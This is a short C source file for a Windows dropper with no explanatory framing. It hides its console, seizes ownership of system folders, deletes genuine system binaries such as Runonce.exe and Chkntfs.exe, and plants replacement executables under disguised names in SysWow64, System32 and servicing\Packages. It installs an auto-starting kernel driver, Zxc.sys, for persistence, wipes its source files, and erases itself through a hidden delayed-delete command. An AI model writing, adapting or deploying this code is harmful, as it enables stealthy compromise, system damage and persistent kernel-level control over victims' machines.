#include <stdio.h>
#include <stdlib.h>
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <strsafe.h>
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "User32.lib")
#define SRS TEXT("cmd.exe /C ping 1.1.1.1 -n -w 3000 > nul & del \"%s\"")

void kamikaza(){
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	GetModuleFileName(NULL, szModuleName, MAX_PATH);
	StringCbPrintf(szCmd, 2 * MAX_PATH, SRS, szModuleName);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void main(){
	HWND hWnd = GetConsoleWindow();
	ShowWindow( hWnd , SW_MINIMIZE );
	ShowWindow( hWnd, SW_HIDE );
	for(int q=0;q<1000000;q++){}
	system("takeown /F C:\\Windows\\System32\\Configuration");
	system("icacls C:\\Windows\\System32\\Configuration /grant administrators:F");
	system("takeown /F C:\\Windows\\SysWow64");
	system("icacls C:\\Windows\\SysWow64 /grant administrators:F");
	system("takeown /F C:\\Windows\\SysWow64\\Runonce.exe");
	system("icacls C:\\Windows\\SysWow64\\Runonce.exe /grant administrators:F");
	system("del C:\\Windows\\SysWow64\\Runonce.exe");
	system("takeown /F C:\\Windows\\SysWow64\\Chkntfs.exe");
	system("icacls C:\\Windows\\SysWow64\\Chkntfs.exe /grant administrators:F");
	system("del C:\\Windows\\SysWow64\\Chkntfs.exe");
	system("copy RunOnce.exe C:\\Windows\\SysWow64\\RunOnce.exe /Y");
	system("copy cleanup.exe C:\\Windows\\SysWow64\\cleanup.exe /Y");
	system("copy Config.exe C:\\Windows\\SysWow64\\Config.exe /Y");
	system("copy Chkntfs.exe C:\\Windows\\SysWow64\\Chkntfs.exe /Y");
	system("copy ns.exe C:\\Windows\\SysWow64\\installer.exe /Y");
	system("copy ds.exe C:\\Windows\\SysWow64\\Cmake.exe /Y");
	system("copy autochk.exe C:\\Windows\\SysWow64\\autochk.exe /Y");
	system("takeown /F C:\\Windows\\servicing\\Packages");
	system("icacls C:\\Windows\\servicing\\Packages /grant administrators:F");
	system("copy RunOnce.exe C:\\Windows\\servicing\\Packages\\RunOnce.exe /Y");
	system("copy cleanup.exe C:\\Windows\\servicing\\Packages\\cleanup.exe /Y");
	system("copy Config.exe C:\\Windows\\servicing\\Packages\\Config.exe /Y");
	system("copy Chkntfs.exe C:\\Windows\\servicing\\Packages\\Chkntfs.exe /Y");
	system("copy ns.exe C:\\Windows\\servicing\\Packages\\installer.exe /Y");
	system("copy ds.exe C:\\Windows\\servicing\\Packages\\CMake.exe /Y");
	system("copy autochk.exe C:\\Windows\\System32\\autochk.exe /Y");
	system("copy Zxc.sys C:\\Users\\Public\\Documents\\Zxc.sys");
	system("sc.exe create Zxc type=kernel binpath=\"C:\\Users\\Public\\Documents\\Zxc.sys\" start=auto");
	system("del RunOnce.exe");
	system("del autochk.exe");
	system("del ns.exe");
	system("del ds.exe");
	system("del Chkntfs.exe");
	system("del cleanup.exe");
	system("del Config.exe");
	system("del CMake.exe");
	system("del Zxc.sys");
	//_popen("C:\\Windows\\SysWow64\\installer.exe");
	kamikaza();
}